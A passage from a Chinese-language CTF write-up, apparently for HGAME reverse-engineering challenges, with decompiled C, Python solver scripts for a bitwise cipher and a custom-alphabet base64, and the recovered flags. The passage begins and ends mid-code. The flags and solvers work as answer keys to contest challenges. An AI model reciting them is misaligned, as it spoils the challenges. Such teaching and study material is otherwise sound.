class="line">      *result = <span class="hljs-number">16</span> * *result + *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) - <span class="hljs-number">87</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理</span></span><br></pre></td></tr></tbody></table></figure>

<p>把整个过程理解清楚之后可以开始写脚本进行一个逆运算了</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># 第三部分逆运算</span></span><br><span class="line">v = [<span class="hljs-number">76</span>, <span class="hljs-number">60</span>, <span class="hljs-number">214</span>, <span class="hljs-number">54</span>, <span class="hljs-number">80</span>, <span class="hljs-number">136</span>, <span class="hljs-number">32</span>, <span class="hljs-number">204</span>]</span><br><span class="line">v0 = <span class="hljs-string">'e4sy_Re_'</span></span><br><span class="line">v14 = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v0)):</span><br><span class="line">    v14.append(<span class="hljs-built_in">ord</span>(v0[i]) ^ v[i])</span><br><span class="line"><span class="hljs-comment"># print(v14)</span></span><br><span class="line"></span><br><span class="line">v16 = []</span><br><span class="line">v1 = <span class="hljs-string">'Easylif3'</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v1)):</span><br><span class="line">    v16.append(<span class="hljs-built_in">ord</span>(v1[i]) ^ v14[i])  <span class="hljs-comment"># v14经过两次和v的异或又变回了原本的值</span></span><br><span class="line"><span class="hljs-comment"># print(v16)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 第二部分逆运算</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):</span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="hljs-number">0x55</span>) ^ ((v16[<span class="hljs-number">7</span> - i] &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>) | v14[i] &amp; <span class="hljs-number">0xAA</span>) % <span class="hljs-number">256</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v16[7-i])[2:].rjust(8, '0'))</span></span><br><span class="line">    v16[<span class="hljs-number">7</span> - i] = (<span class="hljs-number">2</span> * (v14[i] &amp; <span class="hljs-number">0x55</span>) ^ v16[<span class="hljs-number">7</span> - i] &amp; <span class="hljs-number">0xAA</span> | v16[<span class="hljs-number">7</span> - i] &amp; <span class="hljs-number">0x55</span>) % <span class="hljs-number">256</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v16[7-i])[2:].rjust(8, '0'))</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8, '0'))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="hljs-number">0x55</span>) ^ ((v16[<span class="hljs-number">7</span> - i] &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>) | v14[i] &amp; <span class="hljs-number">0xAA</span>) % <span class="hljs-number">256</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8, '0'))</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">5</span>) | ((v14[i] &amp; <span class="hljs-number">0xF8</span>) &gt;&gt; <span class="hljs-number">3</span>)) % <span class="hljs-number">256</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># print(v14)</span></span><br><span class="line"><span class="hljs-comment"># print(v16)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 第一部分逆运算</span></span><br><span class="line">v24 = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]</span><br><span class="line">v25 = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]</span><br><span class="line">alphabet = [<span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">51</span>, <span class="hljs-number">52</span>, <span class="hljs-number">53</span>, <span class="hljs-number">54</span>, <span class="hljs-number">55</span>, <span class="hljs-number">56</span>, <span class="hljs-number">57</span>, <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">99</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>]</span><br><span class="line"><span class="hljs-comment"># 字母表不多，逆运算难以进行所以采用遍历的方式进行计算</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">57</span> &gt;= j &gt; <span class="hljs-number">47</span>:</span><br><span class="line">            tmp = j - <span class="hljs-number">48</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            tmp = j - <span class="hljs-number">87</span></span><br><span class="line">        v24[<span class="hljs-number">2</span>*i]=j</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">57</span> &gt;= v14[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">48</span> &gt; <span class="hljs-number">47</span>:</span><br><span class="line">            v24[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>] = v14[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">48</span></span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> <span class="hljs-number">102</span> &gt;= v14[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">87</span> &gt; <span class="hljs-number">96</span>:</span><br><span class="line">            v24[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>] = v14[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">87</span></span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:</span><br><span class="line">        v25[<span class="hljs-number">2</span> * i] = j</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">57</span> &gt;= j &gt; <span class="hljs-number">47</span>:</span><br><span class="line">            tmp = j - <span class="hljs-number">48</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            tmp = j - <span class="hljs-number">87</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">102</span> &gt;= v16[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">87</span> &gt; <span class="hljs-number">96</span>:</span><br><span class="line">            v25[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>] = v16[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">87</span></span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> <span class="hljs-number">57</span> &gt;= v16[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">48</span> &gt; <span class="hljs-number">47</span>:</span><br><span class="line">            v25[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>] = v16[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">48</span></span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># print(v24)</span></span><br><span class="line"><span class="hljs-comment"># print(v25)</span></span><br><span class="line">flag = <span class="hljs-string">'hgame{'</span>+<span class="hljs-string">''</span>.join([<span class="hljs-built_in">chr</span>(v24[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]) + <span class="hljs-string">''</span>.join([<span class="hljs-built_in">chr</span>(v25[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])+<span class="hljs-string">'}'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure>

<p>输出得到flag</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{0f233e63637982d266cbf41ecb1b0102}</span><br></pre></td></tr></tbody></table></figure>

<p>到虚拟机上验证一下，发现结果正确</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qpqi9.png" alt="bitwise_operation2"></p>
<h4 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h4><p>windows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途</p>
<figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 len; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> len0; <span class="hljs-comment">// edi</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// rax</span></span><br><span class="line">  _BYTE *v6; <span class="hljs-comment">// rbx</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v7; <span class="hljs-comment">// rcx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> flag; <span class="hljs-comment">// [rsp+20h] [rbp-118h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"please input you flag:\n"</span>);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;flag, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>ui64);</span><br><span class="line">  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, &amp;flag, <span class="hljs-number">100</span>i64);</span><br><span class="line">  len = <span class="hljs-built_in">strlen</span>(&amp;flag);                          <span class="hljs-comment">// 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100）</span></span><br><span class="line">  len0 = len;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !len )                                   <span class="hljs-comment">// 若输入空字符串，直接报错</span></span><br><span class="line">  {</span><br><span class="line">LABEL_6:</span><br><span class="line">    v7 = <span class="hljs-string">"try again\n"</span>;</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_7;</span><br><span class="line">  }</span><br><span class="line">  v5 = <span class="hljs-built_in">sub_140002000</span>(len);                      </span><br><span class="line">  v6 = <span class="hljs-built_in">malloc</span>(v5);								<span class="hljs-comment">// 分配空间</span></span><br><span class="line">  <span class="hljs-built_in">cryption</span>(v6, (__int64)&amp;flag, len0);           <span class="hljs-comment">// 加密算法部分</span></span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strncmp</span>(v6, <span class="hljs-string">"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX"</span>, <span class="hljs-number">0x64</span>ui64) )<span class="hljs-comment">// 相同则返回0，跳过if，输出get it，flag正确</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v6 )</span><br><span class="line">      <span class="hljs-built_in">free</span>(v6);</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_6;</span><br><span class="line">  }</span><br><span class="line">  v7 = <span class="hljs-string">"get it\n"</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="hljs-built_in">puts</span>(v7);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//最重要的cryption加密函数</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">signed</span> __int64 __fastcall <span class="hljs-title">sub_140001EB0</span><span class="hljs-params">(_BYTE *a1, __int64 a2, <span class="hljs-keyword">int</span> a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// er10</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// rbx</span></span><br><span class="line">  _BYTE *v6; <span class="hljs-comment">// rdi</span></span><br><span class="line">  _BYTE *v7; <span class="hljs-comment">// r9</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v8; <span class="hljs-comment">// r11</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// rdx</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v10; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v11; <span class="hljs-comment">// cl</span></span><br><span class="line">  <span class="hljs-comment">// a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度</span></span><br><span class="line">  v3 = <span class="hljs-number">0</span>;</span><br><span class="line">  v4 = a3 - <span class="hljs-number">2</span>;</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v7 = a1;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = a2 + <span class="hljs-number">1</span>;</span><br><span class="line">    v9 = ((<span class="hljs-keyword">unsigned</span> __int64)((<span class="hljs-keyword">unsigned</span> __int64)(v4 - <span class="hljs-number">1</span>) * (<span class="hljs-keyword">unsigned</span> __int128)<span class="hljs-number">0xAAAAAAAAAAAAAAAB</span>ui64 &gt;&gt; <span class="hljs-number">64</span>) &gt;&gt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;</span><br><span class="line">    v3 = <span class="hljs-number">3</span> * v9;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      v10 = *(<span class="hljs-keyword">unsigned</span> __int8 *)(v8 - <span class="hljs-number">1</span>);</span><br><span class="line">      v8 += <span class="hljs-number">3</span>i64;</span><br><span class="line">      *v7 = alphabet[v10 &gt;&gt; <span class="hljs-number">2</span>];</span><br><span class="line">      v7[<span class="hljs-number">1</span>] = alphabet[((<span class="hljs-keyword">unsigned</span> __int64)*(<span class="hljs-keyword">unsigned</span> __int8 *)(v8 - <span class="hljs-number">3</span>) &gt;&gt; <span class="hljs-number">4</span>) | <span class="hljs-number">16</span>i64 * (*(_BYTE *)(v8 - <span class="hljs-number">4</span>) &amp; <span class="hljs-number">3</span>)];</span><br><span class="line">      v7[<span class="hljs-number">2</span>] = alphabet[<span class="hljs-number">4</span>i64 * (*(_BYTE *)(v8 - <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0xF</span>) | ((<span class="hljs-keyword">unsigned</span> __int64)*(<span class="hljs-keyword">unsigned</span> __int8 *)(v8 - <span class="hljs-number">2</span>) &gt;&gt; <span class="hljs-number">6</span>)];</span><br><span class="line">      v7[<span class="hljs-number">3</span>] = alphabet[*(_BYTE *)(v8 - <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x3F</span>];</span><br><span class="line">      v7 += <span class="hljs-number">4</span>;</span><br><span class="line">      --v9;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v9 );</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v3 &lt; a3 )</span><br><span class="line">  {</span><br><span class="line">    *v7 = alphabet[(<span class="hljs-keyword">unsigned</span> __int64)*(<span class="hljs-keyword">unsigned</span> __int8 *)(v3 + v5) &gt;&gt; <span class="hljs-number">2</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v3 == a3 - <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v11 = <span class="hljs-number">61</span>;</span><br><span class="line">      v7[<span class="hljs-number">1</span>] = alphabet[<span class="hljs-number">16</span> * (*(_BYTE *)(v3 + v5) &amp; <span class="hljs-number">3</span>)];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v7[<span class="hljs-number">1</span>] = alphabet[((<span class="hljs-keyword">unsigned</span> __int64)*(<span class="hljs-keyword">unsigned</span> __int8 *)(v5 + v3 + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">4</span>) | <span class="hljs-number">16</span>i64 * (*(_BYTE *)(v3 + v5) &amp; <span class="hljs-number">3</span>)];</span><br><span class="line">      v11 = alphabet[<span class="hljs-number">4</span> * (*(_BYTE *)(v5 + v3 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xF</span>)];</span><br><span class="line">    }</span><br><span class="line">    v7[<span class="hljs-number">2</span>] = v11;</span><br><span class="line">    v7[<span class="hljs-number">3</span>] = <span class="hljs-number">61</span>;</span><br><span class="line">    v7 += <span class="hljs-number">4</span>;</span><br><span class="line">  }</span><br><span class="line">  *v7 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> v7 - v6 + <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alphabet=<span class="hljs-string">'abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br></pre></td></tr></tbody></table></figure>

<p>观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64de</span>(<span class="hljs-params">path_in, path_out</span>):</span></span><br><span class="line">    b64_str = <span class="hljs-built_in">open</span>(path_in).read()</span><br><span class="line">    charset = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">    <span class="hljs-comment"># print(charset)</span></span><br><span class="line">    bin_str = []</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b64_str:</span><br><span class="line">        <span class="hljs-keyword">if</span> i != <span class="hljs-string">'='</span>:</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                x = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(charset.index(i))).replace(<span class="hljs-string">'0b'</span>, <span class="hljs-string">''</span>)</span><br><span class="line">            <span class="hljs-keyword">except</span> ValueError:</span><br><span class="line">                <span class="hljs-built_in">print</span>(i)</span><br><span class="line">            bin_str.append(<span class="hljs-string">'{:0&gt;6}'</span>.<span class="hljs-built_in">format</span>(x))  <span class="hljs-comment"># 填充成6位</span></span><br><span class="line">            <span class="hljs-comment"># print(bin_str)</span></span><br><span class="line">    b64_bin = <span class="hljs-built_in">bytearray</span>()  <span class="hljs-comment"># 最后只能写入bytes</span></span><br><span class="line">    nums = <span class="hljs-built_in">len</span>(bin_str) // <span class="hljs-number">4</span></span><br><span class="line">    remain = <span class="hljs-built_in">len</span>(bin_str) % <span class="hljs-number">4</span></span><br><span class="line">    fore_part = bin_str[:<span class="hljs-number">4</span> * nums]  <span class="hljs-comment"># 四个一组截取</span></span><br><span class="line">    <span class="hljs-comment"># print(fore_part)</span></span><br><span class="line">    <span class="hljs-keyword">while</span> fore_part:</span><br><span class="line">        <span class="hljs-comment"># 取4个6位base64字符，作为3个字节</span></span><br><span class="line">        b64_tmp = <span class="hljs-string">''</span>.join(fore_part[:<span class="hljs-number">4</span>])  <span class="hljs-comment"># 4*6/8</span></span><br><span class="line"></span><br><span class="line">        b64_tmp = [<span class="hljs-built_in">int</span>(b64_tmp[x: x + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]]  <span class="hljs-comment"># 转换成10进制</span></span><br><span class="line">        <span class="hljs-comment"># print(b64_tmp)</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b64_tmp:</span><br><span class="line">            b64_bin.append(i)</span><br><span class="line">        fore_part = fore_part[<span class="hljs-number">4</span>:]  <span class="hljs-comment"># 向后移动四位</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> remain:</span><br><span class="line">        remain_part = <span class="hljs-string">''</span>.join(bin_str[nums * <span class="hljs-number">4</span>:])</span><br><span class="line">        <span class="hljs-comment"># print(remain_part)</span></span><br><span class="line">        tmp = [<span class="hljs-built_in">int</span>(remain_part[i * <span class="hljs-number">8</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(remain - <span class="hljs-number">1</span>)]</span><br><span class="line">        <span class="hljs-comment"># print(tmp)</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp:</span><br><span class="line">            b64_bin.append(i)</span><br><span class="line">    <span class="hljs-comment"># print(b64_bin)</span></span><br><span class="line">    fd = <span class="hljs-built_in">open</span>(path_out, <span class="hljs-string">'wb'</span>)</span><br><span class="line">    fd.write(b64_bin)</span><br><span class="line">    fd.close()</span><br><span class="line">    </span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    b64de(<span class="hljs-string">"./pic_en.txt"</span>, <span class="hljs-string">"./pic_de.txt"</span>)</span><br><span class="line">    </span><br></pre></td></tr></tbody></table></figure>

<p>输出的flag为：</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{b45e6a_i5_50_eazy_6VVSQ}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><p>这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜</p>
<figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 